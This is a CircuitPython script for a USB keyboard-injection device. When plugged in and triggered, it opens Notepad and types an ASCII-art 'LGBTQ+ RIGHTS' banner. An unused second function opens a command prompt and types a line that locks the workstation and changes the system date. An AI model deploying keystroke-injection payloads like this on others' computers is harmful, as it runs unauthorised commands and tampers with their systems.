import time
import board
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
from digitalio import DigitalInOut, Direction, Pull

operating_system = 1
payload = 0

button = DigitalInOut(board.D2)
button.direction = Direction.INPUT
button.pull = Pull.UP
led = DigitalInOut(board.D13)
led.direction = Direction.OUTPUT

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

payload_delivered = 0
time.sleep(2)
print("Ready.")
pause = 0.25
def launch_terminal():
    if operating_system is 1:
        led.value = False
        kbd.press(Keycode.GUI)
        kbd.release_all()
        time.sleep(pause)
        layout.write("notepad")
        time.sleep(pause)
        kbd.press(Keycode.ENTER)
        time.sleep(pause)
        kbd.release_all()
        layout.write(" #        #####  ######  #######  #####        \n")
        layout.write(" #       #     # #     #    #    #     #   #   \n")
        layout.write(" #       #       #     #    #    #     #   #   \n")
        layout.write(" #       #  #### ######     #    #     # ##### \n")
        layout.write(" #       #     # #     #    #    #   # #   #   \n")
        layout.write(" #       #     # #     #    #    #    #    #   \n")
        layout.write(" #######  #####  ######     #     #### #       \n")
        layout.write("\n")
        layout.write(" ######  ###  #####  #     # #######  #####    \n")
        layout.write(" #     #  #  #     # #     #    #    #     #   \n")
        layout.write(" #     #  #  #       #     #    #    #         \n")
        layout.write(" ######   #  #  #### #######    #     #####    \n")
        layout.write(" #   #    #  #     # #     #    #          #   \n")
        layout.write(" #    #   #  #     # #     #    #    #     #   \n")
        layout.write(" #     # ###  #####  #     #    #     #####    \n")
        layout.write("        Remember, its gay to be homophobic!    \n")
        layout.write("               Check the system date!            ")
        kbd.press(Keycode.ENTER), kbd.release_all()

def locksystem():
        time.sleep(pause)
        kbd.press(Keycode.GUI)
        kbd.release_all()
        time.sleep(pause)
        layout.write("cmd")
        time.sleep(pause)
        kbd.press(Keycode.ENTER)
        kbd.release_all()
        time.sleep(0.5)
        layout.write("Rundll32.exe user32.dll,LockWorkStation & date 6/28/1970 & exit")
        kbd.press(Keycode.ENTER), kbd.release_all()

while True:
    if button.value is True and payload_delivered is 0:  # run it
        print("Release the water fowl!")  # for debugging in screen or putty
        if payload is 0:
            launch_terminal()
            #locksystem()
            payload_delivered = 1
    if payload_delivered is 1:
     sys.exit()
